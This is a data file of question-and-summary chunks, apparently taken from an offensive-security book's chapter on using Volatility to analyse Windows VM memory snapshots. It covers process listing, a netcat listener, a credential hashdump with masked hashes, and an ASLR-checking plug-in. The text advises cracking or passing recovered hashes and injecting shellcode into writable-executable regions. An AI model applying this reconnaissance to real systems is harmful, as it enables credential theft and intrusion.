winlogon.exe\n2160 MsMpEng.exe \"C:\\ProgramData\\Microsoft\\Windows\nDefender\\platform\\4.18.2008.9-0\\MsMpEng.exe\"\n4732 explorer.exe C:\\Windows\\Explorer.EXE\n4848 svchost.exe C:\\Windows\\system32\\svchost.exe -k\nClipboardSvcGroup -p\n4920 dllhost.exe C:\\Windows\\system32\\DllHost.exe\n/Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\n5084 StartMenuExper\n\"C:\\Windows\\SystemApps\\Microsoft.Windows. . .\"\n5388 MicrosoftEdge.\n\"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_. . .\"\n6452 OneDrive.exe\n\"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\OneDrive\\OneD\nrive.exe\" /background\n6484 FreeDesktopClo \"C:\\Program Files\\Free Desktop\nClock\\FreeDesktopClock.exe\"\n1\n7092 cmd.exe \"C:\\Windows\\system32\\cmd.exe\"\n2\n3312 notepad.exe notepad\n3824 powershell.exe\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n6448 Calculator.exe \"C:\\Program\nFiles\\WindowsApps\\Microsoft.WindowsCalculator_. . .\"\n6684 firefox.exe \"C:\\Program Files (x86)\\Mozilla\nFirefox\\firefox.exe\"\n6432 PowerToys.exe \"C:\\Program\nFiles\\PowerToys\\PowerToys.exe\"\n7124 nc64.exe Required memory at 0x2d7020 is\ninaccessible (swapped)\n3324 smartscreen.ex C:\\Windows\\System32\\smartscreen.exe -\nEmbedding\n4768 ipconfig.exe Required memory at 0x840308e020 is\nnot valid (process exited?)\nThe list shows the process ID, process name, and command line\nwith arguments that started the process. You can see that most\nprocesses were started by the system itself, most likely at boot time.\nThe 1 and 2 processes are typical processes a\ncmd.exe notepad.exe\nuser would start.\nLet’s investigate the running processes a little bit deeper with the\nplug-in, which lists the processes that were running at the\npslist\ntime of the snapshot.\nPS>vol -f WinDev2007Eval-7d959ee5.vmem windows.pslist\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nPID PPID ImageFileName Offset(V) Threads Handles\nSessionId Wow64\n4 0 System 0xa50bb3e6d040 129 -\nN/A False\n72 4 Registry 0xa50bb3fbd080 4 -\nN/A False\n6452 4732 OneDrive.exe 0xa50bb4d62080 25 -\n1 True\n6484 4732 FreeDesktopClo 0xa50bbb847300 1 -\n1 False\n6212 556 SgrmBroker.exe 0xa50bbb832080 6 -\n0 False\n1636 556 svchost.exe 0xa50bbadbe340 8 -\n0 False\n7092 4732 cmd.exe 0xa50bbbc4d080 1 -\n1 False\n3312 7092 notepad.exe 0xa50bbb69a080 3 -\n1 False\n3824 4732 powershell.exe 0xa50bbb92d080 11 -\n1 False\n6448 704 Calculator.exe 0xa50bb4d0d0c0 21 -\n1 False\n4036 6684 firefox.exe 0xa50bbb178080 0 -\n1 True\n6432 4732 PowerToys.exe 0xa50bb4d5a2c0 14 -\n1 False\n4052 4700 PowerLauncher. 0xa50bb7fd3080 16 -\n1 False\n5340 6432 Microsoft.Powe 0xa50bb736f080 15 -\n1 False\n8564 4732 python-3.8.6-a 0xa50bb7bc2080 1 -\n1 True\n7124 7092 nc64.exe 0xa50bbab89080 1 -\n1 False\n3324 704 smartscreen.ex 0xa50bb4d6a080 7 -\n1 False\n7364 4732 cmd.exe 0xa50bbd8a8080 1 -\n1 False\n8916 2136 cmd.exe 0xa50bb78d9080 0 -\n0 False\n4768 8916 ipconfig.exe 0xa50bba7bd080 0 -\n0 False\nHere we see the actual processes and their memory offsets. Some\ncolumns have been omitted for space. Several interesting processes\nare listed, including the and processes we saw in the\ncmd notepad\noutput from the plug-in.\ncmdline\nIt would be nice to see the processes as a hierarchy, so we can\ntell what process started other processes. For that, we’ll use the\nplug-in:\npstree\nPS>vol -f WinDev2007Eval-7d959ee5.vmem windows.pstree\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nPID PPID ImageFileName Offset(V) Threads Handles\nSessionId Wow64\n4 0 System 0xa50bba7bd080 129 N/A\nFalse\n* 556 492 services.exe 0xa50bba7bd080 8 0\nFalse\n** 2176 556 wlms.exe 0xa50bba7bd080 2 0\nFalse\n** 1796 556 svchost.exe 0xa50bba7bd080 13 0\nFalse\n** 776 556 svchost.exe 0xa50bba7bd080 15 0\nFalse\n** 8 556 svchost.exe 0xa50bba7bd080 18 0\nFalse\n*** 4556 8 ctfmon.exe 0xa50bba7bd080 10 1\nFalse\n*** 5388 704 MicrosoftEdge. 0xa50bba7bd080 35 1\nFalse\n*** 6448 704 Calculator.exe 0xa50bba7bd080 21 1\nFalse\n*** 3324 704 smartscreen.ex 0xa50bba7bd080 7 1\nFalse\n** 2136 556 vmtoolsd.exe 0xa50bba7bd080 11 0\nFalse\n*** 8916 2136 cmd.exe 0xa50bba7bd080 0 0\nFalse\n**** 4768 8916 ipconfig.exe 0xa50bba7bd080 0 0\nFalse\n* 4704 624 userinit.exe 0xa50bba7bd080 0\n1 False\n** 4732 4704 explorer.exe 0xa50bba7bd080 92\n1 False\n*** 6432 4732 PowerToys.exe 0xa50bba7bd080 14\n1 False\n**** 5340 6432 Microsoft.Powe 0xa50bba7bd080 15\n1 False\n*** 7364 4732 cmd.exe 0xa50bba7bd080 1\n- False\n**** 2464 7364 conhost.exe 0xa50bba7bd080 4\n1 False\n*** 7092 4732 cmd.exe 0xa50bba7bd080 1\n- False\n**** 3312 7092 notepad.exe 0xa50bba7bd080 3\n1 False\n**** 7124 7092 nc64.exe 0xa50bba7bd080 1\n1 False\n*** 8564 4732 python-3.8.6-a 0xa50bba7bd080 1\n1 True\n**** 1036 8564 python-3.8.6-a 0xa50bba7bd080 5\n1 True\nNow we get a clearer picture. The asterisk in each row indicates\nthe parent-child relationship of the process. For example, the\nprocess (PID 4704) spawned the process.\nuserinit explorer.exe\nLikewise, the process (PID 4732) started the\nexplorer.exe cmd.exe\nprocess (PID 7092). From that process, the user started\nnotepad.exe\nand another process called .\nnc64.exe\nNow let’s check for passwords with the plug-in:\nhashdump\nPS> vol -f WinDev2007Eval-7d959ee5.vmem windows.hashdump\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nUser rid lmhash\nnthash\nAdministrator 500 aad3bXXXXXXaad3bXXXXXX\nfc6eb57eXXXXXXXXXXX657878\nGuest 501 aad3bXXXXXXaad3bXXXXXX\n1d6cfe0dXXXXXXXXXXXc089c0\nDefaultAccount 503 aad3bXXXXXXaad3bXXXXXX\n1d6cfe0dXXXXXXXXXXXc089c0\nWDAGUtilityAccount 504 aad3bXXXXXXaad3bXXXXXX\ned66436aXXXXXXXXXXX1bb50f\nUser 1001 aad3bXXXXXXaad3bXXXXXX\n31d6cfe0XXXXXXXXXXXc089c0\ntim 1002 aad3bXXXXXXaad3bXXXXXX\nafc6eb57XXXXXXXXXXX657878\nadmin 1003 aad3bXXXXXXaad3bXXXXXX\nafc6eb57XXXXXXXXXXX657878\nThe output shows the account usernames and the LM and NT\nhashes of their passwords. Recovering the password hashes on a\nWindows machine after penetration is a common goal of attackers.\nThese hashes can be cracked offline in an attempt to recover the\ntarget’s password, or they can be used in a pass-the-hash attack to\ngain access to other network resources. Whether the target is a\nparanoid user who performs high-risk operations only on a VM or is\nan enterprise attempting to contain some of its users’ activities to\nVMs, looking through the VMs or snapshots on the system is a\nperfect time for attempting to recover these hashes after you’ve\ngained access to the host hardware.\nVolatility makes this recovery process extremely easy.\nWe’ve obfuscated the hashes in our output. You can use your own\noutput as input to a hash-cracking tool to find your way into the VM.\nThere are several online hash-cracking sites; alternatively, you can\nuse John the Ripper on your Kali machine.\nVulnerability Reconnaissance\nNow let’s use Volatility to discover whether the target VM has\nvulnerabilities we may be able to exploit. The plug-in checks\nmalfind\nfor process memory ranges that potentially contain injected code.\nPotential is the key word here—the plug-in is looking for regions of\nmemory that have permissions to read, write, and execute. It is\nworthwhile to investigate these processes since they may enable us\nto leverage some malware that is already available. Alternatively, we\nmay be able to overwrite those regions with our own malware.\nPS>vol -f WinDev2007Eval-7d959ee5.vmem windows.malfind\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nPID Process Start VPN End VPN Tag\nProtection CommitCharge\n1336 timeserv.exe 0x660000 0x660fff VadS\nPAGE_EXECUTE_READWRITE 1\n2160 MsMpEng.exe 0x16301690000 0x1630179cfff VadS\nPAGE_EXECUTE_READWRITE 269\n2160 MsMpEng.exe 0x16303090000 0x1630318ffff VadS\nPAGE_EXECUTE_READWRITE 256\n2160 MsMpEng.exe 0x16304a00000 0x16304bfffff VadS\nPAGE_EXECUTE_READWRITE 512\n6484 FreeDesktopClo 0x2320000 0x2320fff VadS\nPAGE_EXECUTE_READWRITE 1\n5340 Microsoft.Powe 0x2c2502c0000 0x2c2502cffff VadS\nPAGE_EXECUTE_READWRITE 15\nWe’ve encountered a couple of potential problems. The\nprocess (PID 1336) is part of the freeware known as\ntimeserv.exe\n(PID 6484). These processes are not necessarily a\nFreeDesktopClock\nproblem as long as they’re installed under C:\\Program Files.\nOtherwise, the process may be malware masquerading as a clock.\nUsing a search engine, you will find that the process\nMsMpEng.exe\n(PID 2160) is an anti-malware service. Even though these processes\ncontain writable and executable memory regions, they don’t appear\nto be dangerous. Perhaps we could make these processes\ndangerous by writing shellcode into those memory regions, so it’s\nworth taking note of them.\nThe plug-in provides a list of all the network connections\nnetscan\nthe machine had at the time of the snapshot, as shown next.\nAnything that looks suspicious we may be able to leverage in an\nattack.\nPS>vol -f WinDev2007Eval-7d959ee5.vmem windows.netscan\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nOffset Proto LocalAddr LocalPort ForeignAdd\nForeignPort State PID Owner\n0xa50bb7a13d90 TCPv4 0.0.0.0 4444 0.0.0.0 0\n1\nLISTENING 7124 nc64.exe\n0xa50bb9f4c310 TCPv4 0.0.0.0 7680 0.0.0.0 0\nLISTENING 1776 svchost.exe\n0xa50bb9f615c0 TCPv4 0.0.0.0 49664 0.0.0.0 0\nLISTENING 564 lsass.exe\n0xa50bb9f62190 TCPv4 0.0.0.0 49665 0.0.0.0 0\nLISTENING 492 wininit.exe\n0xa50bbaa80b20 TCPv4 192.168.28.128 50948 23.40.62.19 80\n2\nCLOSED\nw0xa50bbabd2010 TCPv4 192.168.28.128 50954 23.193.33.57 443\nCLOSED\n0xa50bbad8d010 TCPv4 192.168.28.128 50953 99.84.222.93 443\nCLOSED\n0xa50bbaef3010 TCPv4 192.168.28.128 50959 23.193.33.57 443\nCLOSED\n0xa50bbaff7010 TCPv4 192.168.28.128 50950 52.179.224.121 443\nCLOSED\n0xa50bbbd240a0 TCPv4 192.168.28.128 139 0.0.0.0 0\nLISTENING\nWe see some connections from the local machine\n(192.168.28.128), apparently to a couple of web servers 2; these\nconnections are now closed. More important are the connections\nmarked . The ones that are owned by recognizable\nLISTENING\nWindows processes ( , , ) may be okay, but the\nsvchost lsass wininit\nprocess is unknown 1. It is listening on port 4444, and it’s\nnc64.exe\nwell worth taking a deeper look by using our substitute from\nnetcat\nChapter 2 to probe that port.\nThe volshell Interface\nIn addition to the command line interface, you can use Volatility in a\ncustom Python shell with the command. This gives you all\nvolshell\nthe power of Volatility as well as a full Python shell. Here is an\nexample of using the plug-in on a Windows image using\npslist\n:\nvolshell\n1\nPS> volshell -w -f WinDev2007Eval-7d959ee5.vmem\n2\n>>> from volatility.plugins.windows import pslist\n>>> dpo(pslist.PsList, primary=self.current_layer,\n3\nnt_symbols=self.config['nt_symbols'])\nPID PPID ImageFileName Offset(V) Threads Handles\nSessionId Wow64\n4 0 System 0xa50bb3e6d040 129 -\nN/A False\n72 4 Registry 0xa50bb3fbd080 4 -\nN/A False\n6452 4732 OneDrive.exe 0xa50bb4d62080 25 -\n1 True\n6484 4732 FreeDesktopClo 0xa50bbb847300 1 -\n1 False\n...\nIn this brief example, we used the switch to tell Volatility that\n-w\nwe're analyzing a Windows image and the switch to specify the\n-f\nimage itself 1. Once we’re in the interface, we use it just\nvolshell\nlike a normal Python shell. That is, you can import packages or write\nfunctions as you normally would, but now you also have Volatility\nembedded in the shell. We import the plug-in 2 and display\npslist\noutput (the function) from the plug-in 3.\ndpo\nYou can find more information on using by entering\nvolshell\n.\nvolshell --help",
    "question": "",
    "summary": "The text discusses using the Volatility memory forensics framework for offensive analysis, such as identifying weakly defended processes and recovering password hashes from a Windows VM. It outlines the installation process and provides examples of Volatility plug-ins for tasks like checking installed services, analyzing command lines, and finding network connections. The framework allows for detailed memory examination, helping attackers understand system configurations and potential vulnerabilities."
  },
  {
    "start": 96,
    "end": 96,
    "text": "Custom Volatility Plug-Ins\nWe’ve just seen how we can use the Volatility plug-ins to analyze a\nVM snapshot for existing vulnerabilities, profile the user by checking\nthe commands and processes in use, and dump the password\nhashes. But since you can write your own custom plug-ins, only your\nimagination limits what you can do with Volatility. If you need\nadditional information based on clues found from the standard plug-\nins, you can make a plug-in of your own.\nThe Volatility team has made it easy to create a plug-in, as long as\nyou follow their pattern. You can even have your new plug-in call\nother plug-ins to make your job even easier.\nLet’s take a look at the skeleton of a typical plug-in:\nimports . . .\n1\nclass CmdLine(interfaces.plugin.PluginInterface):\n@classmethod\n2\ndef get_requirements(cls):\npass\n3\ndef run(self):\npass\n4\ndef generator(self, procs):\npass\nThe main steps here are to create your new class to inherit from\nthe 1, define your plug-in’s requirements 2, define\nPluginInterface\nthe method 3, and define the method 4. The\nrun generator generator\nmethod is optional, but separating it from the method is a useful\nrun\npattern you’ll see in many plug-ins. By separating it and using it as a\nPython generator, you can get faster results and make your code\neasier to understand.\nLet’s follow this general pattern to create a custom plug-in that will\ncheck for processes that are not protected by address space layout\nrandomization (ASLR). ASLR mixes up the address space of a\nvulnerable process, which affects the virtual memory location of\nheaps, stacks, and other operating system allocations. That means\nthat exploit writers cannot determine how the address space of the\nvictim process is laid out at the time of attack. Windows Vista was\nthe first Windows release with ASLR support. In older memory\nimages like Windows XP, you won’t see ASLR protection enabled by\ndefault. Now, with recent machines (Windows 10), almost all\nprocesses are protected.\nASLR doesn’t mean the attacker is out of business, but it makes\nthe job much more complicated. As a first step in reconnoitering the\nprocesses, we’ll create a plug-in to check if a process is protected by\nASLR.\nLet’s get started. Create a directory called plugins. Under that\ndirectory, create a windows directory to contain your custom plug-ins\nfor Windows machines. If you create plug-ins to target a Mac or\nLinux machine, create a directory named mac or linux, respectively.\nNow, in the plugins/windows directory, let’s write our ASLR-\nchecking plug-in, aslrcheck.py:\n# Search all processes and check for ASLR protection\n#\nfrom typing import Callable, List\nfrom volatility.framework import constants, exceptions,\ninterfaces, renderers\nfrom volatility.framework.configuration import requirements\nfrom volatility.framework.renderers import format_hints\nfrom volatility.framework.symbols import intermed\nfrom volatility.framework.symbols.windows import extensions\nfrom volatility.plugins.windows import pslist\nimport io\nimport logging\nimport os\nimport pefile\nvollog = logging.getLogger(__name__)\nIMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040\nIMAGE_FILE_RELOCS_STRIPPED = 0x0001\nWe first handle the imports we’ll need, plus the library for\npefile\nanalyzing Portable Executable (PE) files. Now let’s write a helper\nfunction to do that analysis:\n1\ndef check_aslr(pe):\npe.parse_data_directories([\npefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG']\n])\ndynamic = False\nstripped = False\n2\nif (pe.OPTIONAL_HEADER.DllCharacteristics &\nIMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):\ndynamic = True\n3\nif pe.FILE_HEADER.Characteristics &\nIMAGE_FILE_RELOCS_STRIPPED:\nstripped = True\n4\nif not dynamic or (dynamic and stripped):\naslr = False\nelse:\naslr = True\nreturn aslr\nWe pass a PE file object to the function 1, parse it, and\ncheck_aslr\nthen check for whether it has been compiled with the DYNAMIC\nbase setting 2 and whether the file relocation data has been stripped\nout 3. If it’s not dynamic, or was perhaps compiled as dynamic but\nstripped of its relocation data, then the PE file is not protected by\nASLR 4.\nWith the helper function ready to go, let’s create our\ncheck_aslr\nclass:\nAslrCheck\n1\nclass AslrCheck(interfaces.plugins.PluginInterface):\n@classmethod\ndef get_requirements(cls):\nreturn [\n2\nrequirements.TranslationLayerRequirement(\nname='primary', description='Memory layer for\nthe kernel',\narchitectures=[\"Intel32\", \"Intel64\"]),\n3\nrequirements.SymbolTableRequirement(\nname=\"nt_symbols\", description=\"Windows\nkernel symbols\"),\n4\nrequirements.PluginRequirement(\nname='pslist', plugin=pslist.PsList, version=\n(1, 0, 0)),\n5\nrequirements.ListRequirement(name = 'pid',\nelement_type = int,\ndescription = \"Process ID to include (all others\nare excluded)\",\noptional = True),\n]\nStep one of creating the plug-in is to inherit from the\nobject 1. Next, define the requirements. You can get\nPluginInterface\na good idea of what you need by reviewing other plug-ins. Every\nplug-in needs the memory layer, and we define that requirement first\n2. Along with the memory layer, we also need the symbols tables 3.\nYou’ll find these two requirements used by almost all plug-ins.\nWe’ll also need the plug-in as a requirement in order to get\npslist\nall the processes from memory and re-create the PE file from the\nprocess 4. Then we’ll pass the re-created PE file from each process\nand examine it for ASLR protection.\nWe may want to check a single process given a process ID, so we\ncreate another optional setting that lets us pass in a list of process\nIDs to limit checking to just those processes 5.\n@classmethod\ndef create_pid_filter(cls, pid_list: List[int] = None) ->\nCallable[[interfaces.objects.ObjectInterface], bool]:\nfilter_func = lambda _: False\npid_list = pid_list or []\nfilter_list = [x for x in pid_list if x is not None]\nif filter_list:\nfilter_func = lambda x: x.UniqueProcessId not in\nfilter_list\nreturn filter_func\nTo handle the optional process ID, we use a class method to\ncreate a filter function that returns for every process ID in the\nFalse\nlist; that is, the question we’re asking the filter function is whether to\nfilter out a process, so we return only if the PID is not in the list:\nTrue\ndef _generator(self, procs):\npe_table_name =\n1\nintermed.IntermediateSymbolTable.create(\nself.context,\nself.config_path,\n\"windows\",\n\"pe\",\nclass_types=extensions.pe.class_types)\nprocnames = list()\nfor proc in procs:\nprocname = proc.ImageFileName.cast(\"string\",\nmax_length=proc.ImageFileName.vol.count,\nerrors='replace')\nif procname in procnames:\ncontinue\nprocnames.append(procname)\nproc_id = \"Unknown\"\ntry:\nproc_id = proc.UniqueProcessId\nproc_layer_name = proc.add_process_layer()\nexcept exceptions.InvalidAddressException as e:\nvollog.error(f\"Process {proc_id}: invalid\naddress {e} inlayer {e.layer_name}\")\ncontinue\n2\npeb = self.context.object(\nself.config['nt_symbols'] +\nconstants.BANG + \"_PEB\",\nlayer_name = proc_layer_name,\noffset = proc.Peb)\ntry:\ndos_header = self.context.object(\npe_table_name + constants.BANG +\n\"_IMAGE_DOS_HEADER\",\noffset=peb.ImageBaseAddress,\nlayer_name=proc_layer_name)\nexcept Exception as e:\ncontinue\npe_data = io.BytesIO()\nfor offset, data in dos_header.reconstruct():\npe_data.seek(offset)\npe_data.write(data)\n3\npe_data_raw = pe_data.getvalue()\npe_data.close()\ntry:\n4\npe = pefile.PE(data=pe_data_raw)\nexcept Exception as e:\ncontinue\n5\naslr = check_aslr(pe)\n6\nyield (0, (proc_id,\nprocname,\nformat_hints.Hex(pe.OPTIONAL_HEADER.ImageBase),\naslr,\n))\nWe create a special data structure called 1 to use as\npe_table_name\nwe loop over each process in memory. Then we get the Process\nEnvironment Block (PEB) memory region associated with each\nprocess and put it into an object2. The PEB is a data structure for\nthe current process that contains a wealth of information on the\nprocess. We write that region into a file-like object ( ) 3, create\npe_data\na PE object using the library 4, and pass it to our\npefile check_aslr\nhelper method 5. Finally, we yield the tuple of information containing\nthe process ID, process name, memory address of the process, and\na Boolean result from the ASLR protection check 6.\nNow we create the method, which needs no arguments since\nrun\nall settings are populated in the config object:\ndef run(self):\n1\nprocs = pslist.PsList.list_processes(self.context,\nself.config[\"primary\"],",
    "question": "How can one create a custom Volatility plug-in to check for processes not protected by address space layout randomization (ASLR) on a Windows system?",
    "summary": "Volatility allows users to create custom plug-ins to analyze memory dumps for specific information, such as checking for processes not protected by ASLR. A custom ASLR plug-in can be developed by following Volatility's plugin structure, which includes defining requirements, using a helper function to analyze PE files, and generating results. The plug-in checks if a process is protected by ASLR by examining its PE headers and returns whether it is vulnerable or not."
  },
  {
    "start": 97,
    "end": 97,
    "text": "self.config[\"nt_symbols\"],\nfilter_func =\nself.create_pid_filter(self.config.get('pid',\nNone)))\n2\nreturn renderers.TreeGrid([\n(\"PID\", int),\n(\"Filename\", str),\n(\"Base\", format_hints.Hex),\n(\"ASLR\", bool)],\nself._generator(procs))\nWe get the list of processes using the plug-in 1 and return\npslist\nthe data from the generator using the renderer 2. The\nTreeGrid\nrenderer is used by many plug-ins. It ensures that we get\nTreeGrid\none line of results for each process analyzed.\nKicking the Tires\nLet’s take a look at one of the images made available at the Volatility\nsite: Malware - Cridex. For your custom plug-in, provide the switch\n-p\nwith the path to your plugins folder:\nPS>vol -p .\\plugins\\windows -f cridex.vmem\naslrcheck.AslrCheck\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 0.00 Scanning primary2 using\nPdbSignatureScanner\nPID Filename Base ASLR\n368 smss.exe 0x48580000 False\n584 csrss.exe 0x4a680000 False\n608 winlogon.exe 0x1000000 False\n652 services.exe 0x1000000 False\n664 lsass.exe 0x1000000 False\n824 svchost.exe 0x1000000 False\n1484 explorer.exe 0x1000000 False\n1512 spoolsv.exe 0x1000000 False\n1640 reader_sl.exe 0x400000 False\n788 alg.exe 0x1000000 False\n1136 wuauclt.exe 0x400000 False\nAs you can see, this is a Windows XP machine, and there are no\nASLR protections on any process.\nNext is the result for a clean, up-to-date Windows 10 machine:\nPS>vol -p .\\plugins\\windows -f WinDev2007Eval-Snapshot4.vmem\naslrcheck.AslrCheck\nVolatility 3 Framework 1.2.0-beta.1\nProgress: 33.01 Scanning primary2 using\nPdbSignatureScanner\nPID Filename Base ASLR\n316 smss.exe 0x7ff668020000 True\n428 csrss.exe 0x7ff796c00000 True\n500 wininit.exe 0x7ff7d9bc0000 True\n568 winlogon.exe 0x7ff6d7e50000 True\n592 services.exe 0x7ff76d450000 True\n600 lsass.exe 0x7ff6f8320000 True\n696 fontdrvhost.ex 0x7ff65ce30000 True\n728 svchost.exe 0x7ff78eed0000 True\nVolatility was unable to read a requested page:\nPage error 0x7ff65f4d0000 in layer primary2_Process928 (Page\nFault at entry 0xd40c9d88c8a00400 in page entry)\n* Memory smear during acquisition (try re-acquiring if\npossible)\n* An intentionally invalid page lookup (operating system\nprotection)\n* A bug in the plugin/volatility (re-run with -vvv and file\na bug)\nNo further results will be produced\nNot too much to see here. Every listed process is protected by\nASLR. However, we also see a memory smear. A memory smear\noccurs when the contents of the memory changes as the memory\nimage is taken. That results in the memory table descriptions not\nmatching the memory itself; alternatively, the virtual memory pointers\nmay reference invalid data. Hacking is hard. As the error description\nsays, you can try reacquiring the image (finding or creating a new\nsnapshot).\nLet’s check the PassMark Windows 10 sample memory image:\nPS>vol -p .\\plugins\\windows -f WinDump.mem\naslrcheck.AslrCheck",
    "question": "What is the purpose of the TreeGrid renderer in the context of analyzing process data with the ASLR check plugin?",
    "summary": "The text explains how to use the ASLR check plugin in Volatility to analyze processes on a Windows system. It shows examples of output from Windows XP and Windows 10, highlighting that ASLR protections are disabled in XP and enabled in 10. It also mentions a memory smear error that can occur during memory analysis, which may affect the accuracy of the results."
  },
  {
    "start": 98,
    "end": 98,
    "text": "Volatility 3 Framework 1.2.0-beta.1\nProgress: 0.00 Scanning primary2 using\nPdbSignatureScanner\nPID Filename Base ASLR\n356 smss.exe 0x7ff6abfc0000 True\n2688 MsMpEng.exe 0x7ff799490000 True\n2800 SecurityHealth 0x7ff6ef1e0000 True\n5932 GoogleCrashHan 0xed0000 True\n5380 SearchIndexer. 0x7ff6756e0000 True\n3376 winlogon.exe 0x7ff65ec50000 True\n6976 dwm.exe 0x7ff6ddc80000 True\n9336 atieclxx.exe 0x7ff7bbc30000 True\n9932 remsh.exe 0x7ff736d40000 True\n2192 SynTPEnh.exe 0x140000000 False\n7688 explorer.exe 0x7ff7e7050000 True\n7736 SynTPHelper.ex 0x7ff7782e0000 True\nNearly all processes are protected. Only the single process\nisn’t ASLR protected. An online search shows that this\nSynTPEnh.exe\nis a software component of Synaptics Pointing Device, probably for\ntouch screens. As long as that process is installed in c:\\Program\nFiles, it’s probably okay, but it may be worth fuzzing later on.\nIn this chapter, you saw that you can leverage the power of the\nVolatility framework to find more information about a user’s behavior\nand connections as well as to analyze data on any process running\nmemory. You can use that information to better understand the target\nuser and machine as well as to understand the mindset of a\ndefender.\nOnward!\nYou should have noticed by now that Python is a great language for\nhacking, especially when you consider the many libraries and\nPython-based frameworks you have available. While hackers have a\nplethora of tools, there’s really no substitute for coding your own\ntools, because this gives you a deeper understanding of what those\nother tools are doing.\nGo ahead and quickly code up a custom tool for your special\nrequirements. Whether it’s an SSH client for Windows, a web\nscraper, or a command-and-control system, Python has you\ncovered.",
    "question": "Which process in the Volatility 3 Framework 1.2.0-beta.1 scan is not ASLR protected and what is its likely function?",
    "summary": "The Volatility 3 Framework 1.2.0-beta.1 is used to scan and analyze processes in memory. Most processes are protected, but SynTPEnh.exe, a component of Synaptics Pointing Device, is not ASLR protected and is likely installed in the Program Files directory. Python is highlighted as a valuable language for hacking due to its extensive libraries and frameworks, allowing users to create custom tools for specific needs."
  }
]